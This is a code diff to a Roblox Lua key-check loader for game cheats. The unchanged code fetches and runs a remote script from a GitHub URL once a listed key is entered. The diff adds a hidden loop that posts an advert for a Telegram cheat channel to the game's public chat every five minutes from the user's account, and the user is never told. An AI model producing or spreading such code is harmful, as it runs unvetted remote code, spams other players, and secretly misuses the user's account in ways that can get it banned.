@@ -71,7 +71,7 @@ Status.Text = "Status: Waiting for key..."
 Status.TextColor3 = Color3.fromRGB(255, 255, 255)
 Status.TextSize = 14
 
--- Список валидных ключей (можно заменить на запрос к серверу)
+-- Список валидных ключей
 local validKeys = {
     "QILIN7000",
     "GAMING456",
@@ -82,7 +82,7 @@ local validKeys = {
 
 -- Функция для проверки ключа
 local function isValidKey(key)
-    key = string.upper(string.gsub(key, "%s+", "")) -- Удаляем пробелы и переводим в верхний регистр
+    key = string.upper(string.gsub(key, "%s+", ""))
     
     for _, validKey in pairs(validKeys) do
         if key == validKey then
@@ -92,12 +92,34 @@ local function isValidKey(key)
     return false
 end
 
+-- Функция для авто-отправки сообщений
+local function startAutoChat()
+    local TextChatService = game:GetService("TextChatService")
+    local message = "скачать читы и скрипты можно в телеграм канале qilin scripts le le le le le le le le le le le"
+    local interval = 300 -- 5 минут в секундах
+
+    while true do
+        if TextChatService.TextChannels:FindFirstChild("RBXGeneral") then
+            local success, err = pcall(function()
+                TextChatService.TextChannels.RBXGeneral:SendAsync(message)
+            end)
+            
+            if success then
+                print("✅ Сообщение отправлено: " .. message)
+            else
+                warn("❌ Ошибка: " .. err)
+            end
+        else
+            warn("❌ Чат RBXGeneral не найден!")
+        end
+        wait(interval)
+    end
+end
+
 -- Обработчик кнопки Get Key
 GetKeyButton.MouseButton1Click:Connect(function()
-    -- В Roblox нельзя напрямую работать с буфером обмена, поэтому показываем ссылку
-    local link = "" -- Замените на свою ссылку
+    local link = "https://example.com/get-key" -- Замените на реальную ссылку
     
-    -- В Roblox Studio можно использовать setclipboard, в реальной игре это не сработает
     pcall(function()
         setclipboard(link)
     end)
@@ -105,7 +127,6 @@ GetKeyButton.MouseButton1Click:Connect(function()
     Status.Text = "Status: Link copied to clipboard (or shown in output)"
     print("Get your key from: " .. link)
     
-    -- Через 3 секунды сбрасываем статус
     wait(3)
     Status.Text = "Status: Waiting for key..."
 end)
@@ -124,12 +145,15 @@ CheckKeyButton.MouseButton1Click:Connect(function()
         Status.Text = "Status: Key is VALID! Loading script..."
         Status.TextColor3 = Color3.fromRGB(100, 255, 100)
         
-        -- Выполняем loadstring если ключ правильный
+        -- Загружаем основной скрипт
         local success, err = pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/WAVA094/WAVA094/refs/heads/main/Main%20new%202", true))()
         end)
         
-        if not success then
+        if success then
+            -- Запускаем авто-чат только если основной скрипт загрузился
+            task.spawn(startAutoChat)
+        else
             Status.Text = "Status: Error loading script!"
             Status.TextColor3 = Color3.fromRGB(255, 100, 100)
             warn("Error loading script: " .. err)
@@ -140,7 +164,6 @@ CheckKeyButton.MouseButton1Click:Connect(function()
         Status.TextColor3 = Color3.fromRGB(255, 100, 100)
     end
     
-    -- Через 5 секунд сбрасываем статус
     wait(5)
     Status.Text = "Status: Waiting for key..."
     Status.TextColor3 = Color3.fromRGB(255, 255, 255)
